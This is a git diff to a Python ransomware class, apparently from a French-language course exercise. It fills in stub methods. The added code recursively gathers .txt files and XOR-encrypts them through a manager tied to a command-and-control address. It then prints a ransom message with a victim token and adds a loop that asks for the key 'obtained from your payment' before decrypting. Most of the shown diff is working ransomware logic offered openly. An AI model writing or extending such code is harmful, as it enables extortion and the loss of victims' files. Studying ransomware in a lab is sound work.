@@ -35,16 +35,61 @@ class Ransomware:
             sys.exit(1)
 
     def get_files(self, filter:str)->list:
-        # return all files matching the filter
-        raise NotImplemented()
+        """
+        Renvoie la liste des fichiers avec l'extension stipulée en paramètre 'filter'
+
+        Args:
+            filter (str): extension de fichier de la forme ".xx"
+
+        Returns:
+            list: liste des fichiers avec l'extension 'filter'
+        """
+        # Définition du chemin utilisé
+        dir_path = Path('./')
+        # Initialisation de la liste retournée
+        res = []
+        # Boucle for sur tout les fichiers trouvés avec l'extension donnée en paramètre
+        for file in dir_path.rglob(filter):
+            # Ajout dans la liste final de chaque fichier convertis en string
+            res.append(str(file))
+        return res
 
     def encrypt(self):
+        """
+        Lancement du chiffrage des données de l'utilisateur
+        """
         # main function for encrypting (see PDF)
-        raise NotImplemented()
+        # Récupération des fichiers à chiffrer
+        files = self.get_files("*.txt")
+
+        # Création de l'instance de SecretManager qui va initialisé le chiffrage
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        secret_manager.setup()
+        secret_manager.xorfiles(files)
+        hex_token = secret_manager.get_hex_token()
+        print(ENCRYPT_MESSAGE.format(token=hex_token))
 
     def decrypt(self):
+        """
+        Lancement du déchiffrage des données de l'utilisateur
+        """
         # main function for decrypting (see PDF)
-        raise NotImplemented()
+        # Instance du SecretManager
+        secret_manager = SecretManager(CNC_ADDRESS, TOKEN_PATH)
+        secret_manager.load()
+        # Récupération des fichiers à déchiffrer
+        to_free = self.get_files("*.txt")
+        while True:
+            try:
+                # Demande et vérification de la clé donné par la victime
+                candidate_key = input("Please enter the key you obtain from your payment")
+                secret_manager.set_key(candidate_key)
+                secret_manager.xorfiles(to_free)
+                secret_manager.clean()
+                print("Good key, yes file")
+                break
+            except ValueError as e:
+                print("Error",{e},"Wrong key, no file")
 
 if __name__ == "__main__":
     logging.basicConfig(level=logging.DEBUG)
